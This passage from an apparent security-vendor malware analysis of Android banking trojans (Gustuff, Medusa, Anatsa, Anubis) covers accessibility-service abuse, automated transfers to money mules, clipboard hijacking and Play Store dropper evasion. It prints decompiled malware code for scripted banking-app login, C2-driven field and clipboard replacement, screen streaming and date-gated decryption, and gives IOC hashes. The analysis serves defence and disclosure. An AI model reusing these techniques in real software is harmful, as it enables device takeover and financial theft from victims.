<p>Let’s dig a bit deeper on how this works by analyzing the trojans that have mastered this attack vector this year: Gustuff and Medusa. Let’s take a transfer activity from a demo banking app as an example: from an Accessibility perspective, all the input fields have a so called @Android:id label which can be read and controlled by any AccessiblityService running on the victim’s device. In this example, by providing the bot command<span>&nbsp;</span><code>setText(TEXT)</code>, an attacker can, in a fully automated way, change the beneficiary account number to anything he/she wants in order to transfer funds to a money mule. In general, the malware’s Accessibility script first reads the balance information of a victim (also through an automated process) before they perform this attack.</p> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/labels.webp?width=1600&amp;height=900&amp;name=labels.webp" alt="labels" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/labels.webp?width=800&amp;height=450&amp;name=labels.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/labels.webp?width=1600&amp;height=900&amp;name=labels.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/labels.webp?width=2400&amp;height=1350&amp;name=labels.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/labels.webp?width=3200&amp;height=1800&amp;name=labels.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/labels.webp?width=4000&amp;height=2250&amp;name=labels.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/labels.webp?width=4800&amp;height=2700&amp;name=labels.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>&nbsp;</p> 
<p>To provide a bit more context, the Accessibility script below is used by the Android Banking trojan Gustuff for the St.George Android banking app: it performs a login on behalf of the victim to start a session in a timely fashion (by using some sleep cycles to look more legitimate) and uses this active apps session to script against the transfer screen of the mobile banking app to perform a payment to a mule on behalf of the victim, successfully completing a full ATS attack.</p> 
<div> 
 <div> 
  <pre><code>function stgeorge(info) {<br>&nbsp; &nbsp; let actions = [{<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "open",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "open": "launch",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "value": "org.stgeorge.bank"<br>&nbsp; &nbsp; &nbsp; &nbsp; }, {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "delay",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": 1000<br>&nbsp; &nbsp; &nbsp; &nbsp; }, {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "windows",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "root": true<br>&nbsp; &nbsp; &nbsp; &nbsp; },<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "interactive",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "viewId": "org.stgeorge.bank:id/continue_button",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "click": true<br>&nbsp; &nbsp; &nbsp; &nbsp; }, {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "delay",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": 1000<br>&nbsp; &nbsp; &nbsp; &nbsp; },<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "interactive",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "viewId": "org.stgeorge.bank:id/btn_logon",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "click": true<br>&nbsp; &nbsp; &nbsp; &nbsp; }, {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "delay",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": 1000<br>&nbsp; &nbsp; &nbsp; &nbsp; },<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "interactive",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "viewId": "org.stgeorge.bank:id/logon_button",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "click": true<br>&nbsp; &nbsp; &nbsp; &nbsp; }, {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "delay",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": 8000<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br>&nbsp; &nbsp; ];<br>&nbsp; &nbsp; if (info.securityNum) {<br>&nbsp; &nbsp; &nbsp; &nbsp; actions = actions.concat([{<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "interactive",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "viewId": "org.stgeorge.bank:id/pin_editor",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "setText": info.securityNum<br>&nbsp; &nbsp; &nbsp; &nbsp; }]);<br>&nbsp; &nbsp; } else if (info.pass) {<br>&nbsp; &nbsp; &nbsp; &nbsp; actions = actions.concat([{<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "interactive",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "viewId": "org.stgeorge.bank:id/internet_password_ET",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "setText": info.pass<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }, {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "delay",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": 500<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; },<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": "interactive",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "viewId": "org.stgeorge.bank:id/login_Button",<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "click": true<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br>&nbsp; &nbsp; &nbsp; &nbsp; ]);<br>&nbsp; &nbsp; }<br>&nbsp; &nbsp; return utils.buildCommand("array", {<br>&nbsp; &nbsp; &nbsp; &nbsp; "actions": actions<br>&nbsp; &nbsp; });<br>}</code></pre> 
 </div> 
</div> 
<p>This capability adds a new layer of danger to the Android banking malware ecosystem, by making large scale campaigns more automated and easier to manage for threat actors. To summarize the on-device fraud MO:</p> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/gustuff.webp?width=1600&amp;height=900&amp;name=gustuff.webp" alt="gustuff" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/gustuff.webp?width=800&amp;height=450&amp;name=gustuff.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/gustuff.webp?width=1600&amp;height=900&amp;name=gustuff.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/gustuff.webp?width=2400&amp;height=1350&amp;name=gustuff.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/gustuff.webp?width=3200&amp;height=1800&amp;name=gustuff.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/gustuff.webp?width=4000&amp;height=2250&amp;name=gustuff.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/gustuff.webp?width=4800&amp;height=2700&amp;name=gustuff.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<h3 id="accessibility_event_logging">Accessibility Event Logging</h3> 
<p>Another incredibly powerful feature of multiple families, including Medusa and Gustuff, is event logging. If the bot receives the command from the C2, it starts to recursively collect the information about the active window starting from the root node, which means it is able to collect information about everything that is displayed on the screen. Information of interest includes, but is not limited to, the following:</p> 
<ul> 
 <li>Node bounds in screen coordinates (position of elements in the UI)</li> 
 <li>Text of the node (the text inside an element)</li> 
 <li>Whether this node is password (if the element is a field of type “password”)</li> 
</ul> 
<p>The following snippet from Anatsa shows the code that collects the information of active Node and all its children that are matching a specific string:</p> 
<div> 
 <div> 
  <pre><code>public static List getAllNodes(AccessibilityNodeInfo arg6, String arg7) {<br>&nbsp; &nbsp; String v0 = arg7.toLowerCase();<br>&nbsp; &nbsp; ArrayList v1 = new ArrayList();<br>&nbsp; &nbsp; if (arg6 == null) {<br>&nbsp; &nbsp; &nbsp; &nbsp; return v1;<br>&nbsp; &nbsp; }<br><br>&nbsp; &nbsp; int v2 = arg6.getChildCount();<br>&nbsp; &nbsp; int v3;<br>&nbsp; &nbsp; for (v3 = 0; v3 &lt; v2; ++v3) {<br>&nbsp; &nbsp; &nbsp; &nbsp; AccessibilityNodeInfo v4 = arg6.getChild(v3);<br>&nbsp; &nbsp; &nbsp; &nbsp; if (v4 != null) {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (v4.getClassName() != null &amp;&amp; v4.getClassName().toString().toLowerCase().contains(v0))) {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; v1.add(v4);<br>&nbsp; &nbsp; &nbsp; &nbsp; } else {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; v1.addAll(Utils.getAllNodes(v4, arg7));<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br>&nbsp; &nbsp; }<br>}<br>return v1;<br>}</code></pre> 
 </div> 
</div> 
<p>By collecting all this data, the actor can get a better understanding of the interface of different applications and therefore implement relevant scenarios for accessibility scripting feature. Moreover, it allows actors to have deeper insights on the applications the victim uses, its typical usage and it allows actors to intercept some of its data.</p> 
<h3 id="replacing_account_number_in_input_fields">Replacing account number in input fields</h3> 
<p>Another Accessibility trick has been introduced by Medusa Android banking trojan, and it is triggered by the command<span>&nbsp;</span><code>fillfocus</code>. This feature allows the actor to change the content of the focused input field with some text specified by the attacker. This feature can be used to invisibly substitute the victim’s input with the one set by the actor(s). This is done by abusing the AccessibilityService. The following snippet shows the code that sets the focused input field with text received from the C2:</p> 
<div> 
 <div> 
  <pre><code>public void fillfocus(int cmdId, String t_text) {<br>&nbsp; &nbsp; if (WorkerAccessibilityService.accessibilityService != null) {<br>&nbsp; &nbsp; &nbsp; &nbsp; Bundle bundle = new Bundle();<br>&nbsp; &nbsp; &nbsp; &nbsp; bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", t_text); //find FOCUS_INPUT field
&nbsp; &nbsp; &nbsp; &nbsp; AccessibilityNodeInfo accessNodeInfo = WorkerAccessibilityService.accessibilityService.findFocus(1);<br>&nbsp; &nbsp; &nbsp; &nbsp; if (accessNodeInfo != null) { 
//perform ACTION_SET_TEXT
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; accessNodeInfo.performAction(0x200000, bundle);<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br>&nbsp; &nbsp; &nbsp; &nbsp; this.sendCmdExecuted(cmdId);<br>&nbsp; &nbsp; &nbsp; &nbsp; return;<br>&nbsp; &nbsp; }<br>&nbsp; &nbsp; throw null;<br>}</code></pre> 
 </div> 
</div> 
<p>With this feature, actors can for example modify the bank account number that the victim selected with one controlled by the attacker, effectively tricking the victim into transferring money to a money mule.</p> 
<h3 id="clipper">Clipper</h3> 
<p>Another newly introduced feature is the capability to change the clipboard content to some text specified by the actor(s). The Medusa Trojan can receive the command “copyclip” with as parameter text to be set. This is a common MO for so called “clippers”, a type of malware that steals or substitutes the clipboard data. Similar in concept to the previous technique, it is usually used in order to invisibly substitute some sensitive data such as, IBAN or cryptocurrency wallet address, tricking the victim into performing an operation, such as a transaction, to a beneficiary which was not the original one. The following snippet shows the code that sets the clipboard data with text received from the C2:</p> 
<div> 
 <div> 
  <pre><code>private void copyclip(int cmdId, String textFromC2) {<br>&nbsp; &nbsp; Context ctx = this.mContext.getApplicationContext();<br>&nbsp; &nbsp; try {<br>&nbsp; &nbsp; &nbsp; &nbsp; ((ClipboardManager) ctx.getSystemService("clipboard"))<br>&nbsp; &nbsp; &nbsp; &nbsp; .setPrimaryClip(ClipData.newPlainText("Copied Text", textFromC2));<br>&nbsp; &nbsp; } catch (Exception unused_ex) {}<br>&nbsp; &nbsp; this.sendCmdExecuted(cmdId);<br>}</code></pre> 
 </div> 
</div> 
<h3 id="screen_casting_using_integrated_solutions">Screen casting using integrated solutions</h3> 
<p>In the past 2 years Android banking trojans actors have focused on adding so called Remote Access Trojan (RAT) capabilities by installing and configuring an additional VNC and Team services on the victims. This is a very loud activity from malware detection perspective. It seems that new actors behind trojans such as Medusa, have figured out that the Android OS itself can natively support the hidden RAT objective. Many new families are using Accessibility services to perform actions on the victims’ behalf in combination with audio and video streaming using RTSP (Real Time Streaming Protocol) giving an incredibly powerful feature to the RAT without the need to install additional apps such as VNC/TeamViewer:</p> 
<div> 
 <div> 
  <pre><code>public static String lA(int arg3, String arg4, String arg5, String arg6) {<br>&nbsp; &nbsp; StringBuilder v0 = new StringBuilder().insert(0, "m=video 0 RTP/AVP 96\r\na=rtpmap:96 H265/90000\r\na=fmtp:96 sprop-sps=");<br>&nbsp; &nbsp; v0.append(arg4);<br>&nbsp; &nbsp; v0.append("; sprop-pps=");<br>&nbsp; &nbsp; v0.append(arg5);<br>&nbsp; &nbsp; v0.append("; sprop-vps=");<br>&nbsp; &nbsp; v0.append(arg6);<br>&nbsp; &nbsp; v0.append(";\r\na=control:trackID=");<br>&nbsp; &nbsp; v0.append(arg3);<br>&nbsp; &nbsp; v0.append("\r\n");<br>&nbsp; &nbsp; return v0.toString();<br>}</code></pre> 
 </div> 
</div> 
<h2 id="distribution">Distribution</h2> 
<h3 id="new_google_play_store_banking_malware_campaign">New Google Play Store banking malware campaign</h3> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/distribution.webp?width=1600&amp;height=900&amp;name=distribution.webp" alt="distribution" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/distribution.webp?width=800&amp;height=450&amp;name=distribution.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/distribution.webp?width=1600&amp;height=900&amp;name=distribution.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/distribution.webp?width=2400&amp;height=1350&amp;name=distribution.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/distribution.webp?width=3200&amp;height=1800&amp;name=distribution.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/distribution.webp?width=4000&amp;height=2250&amp;name=distribution.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/distribution.webp?width=4800&amp;height=2700&amp;name=distribution.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>ThreatFabric has been tracking a strong group that has been very successful in spreading trojans on the Google Play Store using apps masquerading as “QR Scanners”. The main purpose of these so-called malware dropper apps is to spread a private/customized version of the Anubis Banking Trojan targeting over 1200 banking and cryptocurrency wallet apps.</p> 
<p>The dropper apps have been successfully reappearing in the Google Play Store over a period of 13 months, regardless of our strong efforts in reporting these apps as malicious to Google.</p> 
<p>The first Google Play dropper app masquerading as “QR Scanner” appeared in February 2020 (com.tasklog.qrcodescanner) and one of the latest (com.quar.qrscanner) was uploaded to the Play Store on March 2021. This malware distribution campaign has resulted in at least 30.000 infected devices, and the actors behind them are preparing a new dropper app at the time of writing.</p> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/evasion.webp?width=1600&amp;height=900&amp;name=evasion.webp" alt="evasion" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/evasion.webp?width=800&amp;height=450&amp;name=evasion.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/evasion.webp?width=1600&amp;height=900&amp;name=evasion.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/evasion.webp?width=2400&amp;height=1350&amp;name=evasion.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/evasion.webp?width=3200&amp;height=1800&amp;name=evasion.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/evasion.webp?width=4000&amp;height=2250&amp;name=evasion.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/evasion.webp?width=4800&amp;height=2700&amp;name=evasion.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>The dropper apps are only active for a short time with long-time pauses between active periods. To stay under the radar, it also implements several evasion techniques to bypass static and dynamic analysis during the Google Play Store evaluation period, as well as to make further analysis by security researchers and AV products more complicated. For example, the string decryption routine will be performed correctly only if a datetime check will be passed: if the date is earlier then stated in the code, the decryption will be performed in a wrong way, which will prevent the decryption, and therefore the launch of the malicious dropper code.</p> 
<div> 
 <div> 
  <pre><code>public static byte[] decrypt_string(byte[] arg1) {<br>&nbsp; &nbsp; return qk.is_later_then_05_03_2021() ?<br>&nbsp; &nbsp; &nbsp; &nbsp; ra.xor_int(arg1, rq.int_52) : ra.xor_int(arg1, 0);<br>}</code></pre> 
 </div> 
</div> 
<p>After the deadline passed, the malicious dropper is decrypted and launched. Nevertheless, this stage will also perform several checks to define if the device is suitable to download the actual payload. The dropper will collect the information about the device and send it to the C2: hardware information, list of all system and third-party packages installed on the device, is device being used to debug applications via USB, etc. On the C2 side the actor(s) will decide whether to continue with downloading the payload or not.</p> 
<p>The C2 will respond, whether the dropper should download a payload or kill itself. If “kill” command is received, the malicious code launched earlier will be deleted from the device and never be launched again.</p> 
<p>The whole process is highly manually maintained by the actor(s), making it difficult to detect from an automated perspective.</p> 
<p>The actual payload seen by ThreatFabric analysts is a private and customized variant of the Anubis Trojan that is packed with a commercial tool (Dexprotector). This campaign shows that actor(s) behind banking Trojans are highly skilled and inventive to stay under the radar and deliver the malicious applications on users’ devices.</p> 
<h2 id="conclusion">Conclusion</h2> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/conclusion.webp?width=1600&amp;height=900&amp;name=conclusion.webp" alt="conclusion" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/conclusion.webp?width=800&amp;height=450&amp;name=conclusion.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/conclusion.webp?width=1600&amp;height=900&amp;name=conclusion.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/conclusion.webp?width=2400&amp;height=1350&amp;name=conclusion.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/conclusion.webp?width=3200&amp;height=1800&amp;name=conclusion.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/conclusion.webp?width=4000&amp;height=2250&amp;name=conclusion.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/conclusion.webp?width=4800&amp;height=2700&amp;name=conclusion.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>There has been a 129% increase in targeted banking apps in the span of only one year. A noticeable addition are cryptocurrency wallets apps, that are now part of every new Android banking trojan family.</p> 
<p>Existing families like Gustuff and new Android Banking Trojans like Medusa have fully adapted to performing on-device fraud attacks by automating the login sequence, checking balance of the victim, and creating payments to money mules using ATS (Automated Transfer System) modules. This attack vector is achieved by abusing Accessibility features of the Android operating system. To continue fortifying the on-device fraud strategy, adversaries also discovered that they can use native Android code (instead of TeamViewer/VNC) to achieve screen streaming capabilities (using RTSP), making the attack less noticeable on the victim’s device. Chaining this native screen streaming feature of Android with Accessibility controls, such as performing actions (clicks) on the victims’ behalf, results in a full hidden Remote Access Trojan (RAT). We can consider these developments a significant threat to mobile payments on the Android platform.</p> 
<p>This overview shows a brief recap of the main ATS capabilities from different families:</p> 
<p>&nbsp;</p> 
<p><img loading="lazy" src="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/recap.webp?width=1600&amp;height=900&amp;name=recap.webp" alt="recap" width="1600" height="900" style="height: auto; max-width: 100%; width: 1600px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/recap.webp?width=800&amp;height=450&amp;name=recap.webp 800w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/recap.webp?width=1600&amp;height=900&amp;name=recap.webp 1600w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/recap.webp?width=2400&amp;height=1350&amp;name=recap.webp 2400w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/recap.webp?width=3200&amp;height=1800&amp;name=recap.webp 3200w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/recap.webp?width=4000&amp;height=2250&amp;name=recap.webp 4000w, https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/blog/the-rage/recap.webp?width=4800&amp;height=2700&amp;name=recap.webp 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></p> 
<p>&nbsp;</p> 
<p>The success rate of one Gustuff botnet (4 active botnets at the time of writing) in only one week time consisted in 757 harvested credentials and ATS fraud attempts in countries such as the UK, Canada and Australia.</p> 
<p>The Rage does not end here, adversaries have also proven to continuously bypass Google Play Store malware protection controls with apps masquerading as “QR-Reader/Scanner” over a year time resulting in a strong private botnet of at least 30.000 infections targeting over 200 banking apps with a private version of Anubis that is obfuscated with a commercial tool (DexProtector).</p> 
<p>Most of the new strains of these malware families are now raging as privately run projects, switching from the very loud MaaS (Malware as a Service) trend that we observed last year. This could also be a result of the increasing success/attempts of law enforcement efforts to catch and punish the people behind these threats and boldly disturbing underground forms.</p> 
<p>More than ever, a clear overview and understanding of the mobile banking threat landscape is crucial for mobile payments, and tools to detect the attack behavior such as ATS from Android banking malware on devices have become invaluable to avoid fraud.</p> 
<h2 id="appendix">Appendix</h2> 
<h3 id="iocs">IOCs</h3> 
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;"> 
 <thead> 
  <tr> 
   <th>Name</th> 
   <th>SHA256 Hash</th> 
  </tr> 
 </thead> 
 <tbody> 
  <tr> 
   <td>Anubis QRcode Dropper</td> 
   <td><code>998ba967bb23e6324c8f689ca0e1b5f28434d1ffdd52eac751f0649f037328c1</code></td> 
  </tr> 
  <tr> 
   <td>Anubis.C</td> 
   <td><code>617f3969267477d9c50e089139ea7627f1916259fc9b8c5028e2257a7ab7077a</code></td> 
  </tr> 
  <tr> 
   <td>Anatsa.A</td> 
   <td><code>a20f6c19ef20213df5b8e277d21dd70fe1cf99215ab42c39d69cce2396e72972</code></td> 
  </tr> 
  <tr> 
   <td>Medusa.B</td> 
   <td><code>05c8fc94e6f08bb0600fe7d8177a17ad65f01ec34fe749ea4981994dd890b1c8</code></td> 
  </tr> 
  <tr> 
   <td>Gustuff.C</td> 
   <td><code>3d196d954a2ea68c5ea65901fb7905b4773ead3fdb6967400beb370580e6f4a5</code></td> 
  </tr> 
 </tbody> 
</table> 
<h3 id="capabilities">Capabilities</h3> 
<h4 id="medusab">Medusa.B</h4> 
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;"> 
 <thead> 
  <tr> 
   <th>Name</th> 
   <th>Description</th> 
  </tr> 
 </thead> 
 <tbody> 
  <tr> 
   <td>Clipboard interaction</td> 
   <td>The malware can extract data from or insert data into the device’s clipboard</td> 
  </tr> 
  <tr> 
   <td>App auto-start at device boot</td> 
   <td>The malware starts automatically when the device is turned on or restarted</td> 
  </tr> 
  <tr> 
   <td>App termination</td> 
   <td>The malware can terminate apps</td> 
  </tr> 
  <tr> 
   <td>Preventing removal</td> 
   <td>The malware can prevent it’s removal</td> 
  </tr> 
  <tr> 
   <td>Hiding the app icon</td> 
   <td>The malware can hide it’s icon from the application drawer</td> 
  </tr> 
  <tr> 
   <td>Screen streaming</td> 
   <td>The malware can stream what is displayed on the device’s screen</td> 
  </tr> 
  <tr> 
   <td>Alerts</td> 
   <td>The malware can issue Android alerts with arbitrary text</td> 
  </tr> 
  <tr> 
   <td>Push notifications</td> 
   <td>The malware can show push notifications</td> 
  </tr> 
  <tr> 
   <td>Screen locking</td> 
   <td>The malware can lock the screen of the infected device</td> 
  </tr> 
  <tr> 
   <td>(Partial) Automated Transfer System</td> 
   <td>The malware uses a AccessibilityService to control the infected device and perform automated payments using the targeted banking apps (still requires interaction from the C2 to initiate the process)</td> 
  </tr> 
  <tr> 
   <td>Web pages</td> 
   <td>The malware can show arbitrary web pages on the infected device</td> 
  </tr> 
  <tr> 
   <td>App removal</td> 
   <td>The malware can remove applications</td> 
  </tr> 
  <tr> 
   <td>App starting</td> 
   <td>The malware can start applications</td> 
  </tr> 
  <tr> 
   <td>App installing</td> 
   <td>The malware can install applications</td> 
  </tr> 
  <tr> 
   <td>SMS spamming</td> 
   <td>The malware can perform SMS spam campaigns</td> 
  </tr> 
  <tr> 
   <td>SMS sending</td> 
   <td>The malware can send SMS messages</td> 
  </tr> 
  <tr> 
   <td>Target list update</td> 
   <td>Actors can configure targets for overlay phishing attack dynamically</td> 
  </tr> 
  <tr> 
   <td>Application listing</td> 
   <td>The malware can access list of all installed applications and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Contact list collection</td> 
   <td>The malware can read the contact list of the infected device and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Device info collection</td> 
   <td>The malware can access device related information(SIM, build info, settings) and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Accessibility event logging</td> 
   <td>The malware uses a AccessibilityService to get a stream of events happening on the device and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>SMS forwarding</td> 
   <td>The malware can forward all incoming SMS messages to a phone number controlled by actors</td> 
  </tr> 
  <tr> 
   <td>SMS listing</td> 
   <td>The malware can access the content of SMS messages and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Keylogging</td> 
   <td>The malware can log victim’s keystrokes and send them to the C2</td> 
  </tr> 
  <tr> 
   <td>Dynamic overlaying</td> 
   <td>The malware can show phishing screens to steal information. Phishing screens are retrieved from the C2</td> 
  </tr> 
 </tbody> 
</table> 
<h4 id="anatsaa">Anatsa.A</h4> 
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;"> 
 <thead> 
  <tr> 
   <th>Name</th> 
   <th>Description</th> 
  </tr> 
 </thead> 
 <tbody> 
  <tr> 
   <td>Clipboard interaction</td> 
   <td>The malware can extract data from or insert data into the device’s clipboard</td> 
  </tr> 
  <tr> 
   <td>App auto-start at device boot</td> 
   <td>The malware starts automatically when the device is turned on or restarted</td> 
  </tr> 
  <tr> 
   <td>App termination</td> 
   <td>The malware can terminate apps</td> 
  </tr> 
  <tr> 
   <td>Preventing removal</td> 
   <td>The malware can prevent it’s removal</td> 
  </tr> 
  <tr> 
   <td>Hiding the app icon</td> 
   <td>The malware can hide it’s icon from the application drawer</td> 
  </tr> 
  <tr> 
   <td>Files/pictures collection</td> 
   <td>The malware can access the file system of the infected device and upload it’s content to the C2</td> 
  </tr> 
  <tr> 
   <td>Alerts</td> 
   <td>The malware can issue Android alerts with arbitrary text</td> 
  </tr> 
  <tr> 
   <td>Push notifications</td> 
   <td>The malware can show push notifications</td> 
  </tr> 
  <tr> 
   <td>Screen locking</td> 
   <td>The malware can lock the screen of the infected device</td> 
  </tr> 
  <tr> 
   <td>(Partial) Automated Transfer System</td> 
   <td>The malware uses a AccessibilityService to control the infected device and perform automated payments using the targeted banking apps (still requires interaction from the C2 to initiate the process)</td> 
  </tr> 
  <tr> 
   <td>Web pages</td> 
   <td>The malware can show arbitrary web pages on the infected device</td> 
  </tr> 
  <tr> 
   <td>App removal</td> 
   <td>The malware can remove applications</td> 
  </tr> 
  <tr> 
   <td>App starting</td> 
